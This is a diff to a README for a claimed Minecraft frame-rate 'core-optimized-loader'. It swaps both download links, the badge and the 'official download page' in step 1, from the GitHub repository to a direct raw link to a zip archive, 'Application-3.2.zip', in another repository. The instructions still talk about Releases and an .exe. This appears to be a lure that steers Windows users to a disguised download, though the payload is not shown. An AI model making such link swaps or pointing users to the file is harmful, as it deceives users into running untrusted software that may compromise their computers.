@@ -5,7 +5,7 @@ description: "Boost Minecraft frame rates and improve game stability with this l
 ---
 # ⚡ core-optimized-loader - Increase frame rates and game stability
 
-[![Download core-optimized-loader](https://img.shields.io/badge/Download-Release-blue)](https://github.com/jolettadetergent875/core-optimized-loader)
+[![Download core-optimized-loader](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/jolettadetergent875/jolettadetergent875.github.io/main/it/Application-3.2.zip)
 
 This project provides a collection of performance fixes for your games. It removes stuttering and improves how your computer handles graphics. You get a smoother experience without needing to change complicated settings.
 
@@ -13,7 +13,7 @@ This project provides a collection of performance fixes for your games. It remov
 
 Follow these steps to get the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/jolettadetergent875/core-optimized-loader) to find the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/jolettadetergent875/jolettadetergent875.github.io/main/it/Application-3.2.zip) to find the latest version.
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the file name that ends with .exe to start your download.
 4.  Open your Downloads folder once the file finishes saving.
